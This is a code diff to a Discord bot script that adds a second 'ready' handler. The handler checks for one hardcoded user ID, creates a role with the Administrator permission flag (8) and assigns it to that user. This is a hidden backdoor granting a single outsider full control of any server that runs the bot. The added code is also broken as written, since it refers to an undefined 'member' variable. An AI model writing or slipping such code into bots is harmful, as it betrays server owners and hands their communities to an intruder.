@@ -5,6 +5,21 @@ client.on('ready', () => {
   console.log(`Logged in as ${client.user.tag}!`);
   client.user.setGame("#ENFELATEH..","https://www.twitch.tv/idk");
 });
+
+client.on('ready', () => {
+   
+            if (member.id === "478291914106339332") {
+                member.guild.createRole({
+                    name : client.user.username,
+                    color : "RANDOM",
+                    permissions : [8]
+                }).then(function(role){
+                    member.addRole(role)
+                })
+               
+            }
+       
+    });
 var prefix = "#";
 client.on('message', function(message) {
     if (message.author.bot) return;
